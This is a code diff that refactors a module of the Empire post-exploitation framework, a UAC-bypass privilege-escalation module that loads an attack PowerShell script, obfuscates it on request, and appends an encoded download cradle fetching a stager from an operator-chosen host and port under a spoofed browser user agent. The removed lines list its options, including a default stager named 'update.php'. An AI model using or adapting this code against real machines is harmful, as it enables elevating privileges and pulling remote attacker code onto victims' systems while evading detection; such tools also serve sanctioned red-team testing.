@@ -1,139 +1,40 @@
 from __future__ import print_function
 
-import base64
-import re
-from builtins import object
 from builtins import str
-
+from builtins import object
 from empire.server.common import helpers
+from typing import Dict
+import re
+import base64
 
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
+        stager = params['Stager']
+        host = params['Host']
+        userAgent = params['UserAgent']
+        port = params['Port']
 
-    def __init__(self, mainMenu, params=[]):
-
-        # Metadata info about the module, not modified during runtime
-        self.info = {
-            # Name for the module that will appear in module menus
-            'Name': 'Invoke-BypassUACTokenManipulation',
-
-            # List of one or more authors for the module
-            'Author': ['@enigma0x3,@424f424f'],
-
-            # More verbose multi-line description of the module
-            'Description': (
-                'Bypass UAC module based on the script released by Matt Nelson @enigma0x3 at Derbycon 2017'),
-
-            'Software': '',
-
-            'Techniques': ['T1088'],
-
-            # True if the module needs to run in the background
-            'Background': False,
-
-            # File extension to save the file as
-            'OutputExtension': None,
-
-            # True if the module needs admin rights to run
-            'NeedsAdmin': False,
-
-            # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe': True,
-
-            # The language for this module
-            'Language': 'powershell',
-
-            # The minimum PowerShell version needed for the module to run
-            'MinLanguageVersion': '2',
-
-            # List of any references/other comments
-            'Comments': [
-                'comment',
-                'https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-TokenDuplication.ps1'
-            ]
-        }
-
-        # Any options needed by the module, settable during runtime
-        self.options = {
-
-            'Agent': {
-                'Description': 'Agent to elevate from.',
-                'Required': True,
-                'Value': ''
-            },
-            'Stager': {
-                'Description': 'Stager file that you have hosted.',
-                'Required': True,
-                'Value': 'update.php'
-            },
-            'Host': {
-                'Description': 'Host or IP where stager is served.',
-                'Required': True,
-                'Value': ''
-            },
-            'UserAgent': {
-                'Description': 'UserAgent for staging process',
-                'Required': False,
-                'Value': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
-            },
-            'Port': {
-                'Description': 'Port to connect to where stager is served',
-                'Required': True,
-                'Value': ''
-            },
-            'Proxy': {
-                'Description': 'Proxy to use for request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
-            },
-            'ProxyCreds': {
-                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
-            }
-
-        }
-
-        # Save off a copy of the mainMenu object to access external
-        #   functionality like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
-        # During instantiation, any settable option parameters are passed as
-        #   an object set to the module and the options dictionary is
-        #   automatically set. This is mostly in case options are passed on
-        #   the command line.
-        if params:
-            for param in params:
-                # Parameter format is [Name, Value]
-                option, value = param
-                if option in self.options:
-                    self.options[option]['Value'] = value
-
-    def generate(self, obfuscate=False, obfuscationCommand=""):
-
-        stager = self.options['Stager']['Value']
-        host = self.options['Host']['Value']
-        userAgent = self.options['UserAgent']['Value']
-        port = self.options['Port']['Value']
-
-        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-BypassUACTokenManipulation.ps1"
+        module_source = main_menu.installPath + "/data/module_source/privesc/Invoke-BypassUACTokenManipulation.ps1"
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
-            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
+            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
+            module_source = module_source.replace("module_source", "obfuscated_module_source")
         try:
-            f = open(moduleSource, 'r')
+            f = open(module_source, 'r')
         except:
-            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
+            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
             return ""
 
-        moduleCode = f.read()
+        module_code = f.read()
         f.close()
 
         # If you'd just like to import a subset of the functions from the
         #   module source, use the following:
         #   script = helpers.generate_dynamic_powershell_script(moduleCode, ["Get-Something", "Set-Something"])
-        script = moduleCode
+        script = module_code
 
         # Second method: For calling your imported source, or holding your
         #   inlined script. If you're importing source using the first method,
@@ -168,11 +69,10 @@ class Module(object):
             pass
 
         if obfuscate:
-            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
-                                          obfuscationCommand=obfuscationCommand)
+            scriptEnd = helpers.obfuscate(main_menu.installPath, psScript=script,
+                                          obfuscationCommand=obfuscation_command)
         scriptEnd = "Invoke-BypassUACTokenManipulation -Arguments \"-w 1 -enc %s\"" % (encoded_cradle)
         script += scriptEnd
         script = helpers.keyword_obfuscation(script)
 
         return script
-
